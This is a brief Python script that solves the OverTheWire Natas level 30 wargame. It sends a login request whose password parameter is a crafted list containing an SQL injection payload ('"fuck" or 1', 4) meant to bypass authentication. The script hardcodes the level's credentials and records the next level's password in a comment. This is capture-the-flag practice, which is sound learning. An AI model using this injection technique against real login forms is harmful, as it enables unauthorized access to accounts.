
from bs4 import BeautifulSoup
import requests
import urllib.parse

lvl_name = 'natas30'
lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X')
url = f'http://{lvl_name}.natas.labs.overthewire.org'
my_params = {'username': 'natas30', 'password': ['"fuck" or 1', 4]}

res = requests.post(url=url,auth=lvl_pass, data=my_params)

# natas31_pw = AMZF14yknOn9Uc57uKB02jnYuhplYka3

